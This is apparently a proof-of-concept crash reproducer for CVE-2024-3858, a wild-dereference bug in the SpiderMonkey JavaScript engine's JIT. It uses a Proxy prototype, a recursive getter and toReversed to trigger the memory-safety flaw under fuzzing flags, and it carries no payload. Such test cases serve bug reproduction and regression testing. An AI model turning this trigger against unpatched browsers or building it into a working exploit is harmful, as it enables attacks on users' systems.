// CVE-2024-3858: JIT Weak Cache IR Stub Tracing wild deref
// Bug 1888892 - Wild deref in js::CheckTracedThing<js::Shape>
// Run with: --fuzzing-safe --gc-zeal=10
function probe(value) {
    let originalPrototype, newPrototype;
    let handler = {
        get(target, key, receiver) {
            return Reflect.get(target, key, receiver);
        },
    };

    try {
        originalPrototype = Object.getPrototypeOf(value);
        newPrototype = new Proxy(originalPrototype, handler);
        Object.setPrototypeOf(value, newPrototype);
    } catch (e) {}
}


const v0 = [];
function f1() {
    Object.defineProperty(v0, 5, { configurable: true, get: f1 });
    try { v0.toReversed(); } catch (e) {}
    probe([].__proto__);
}
f1();
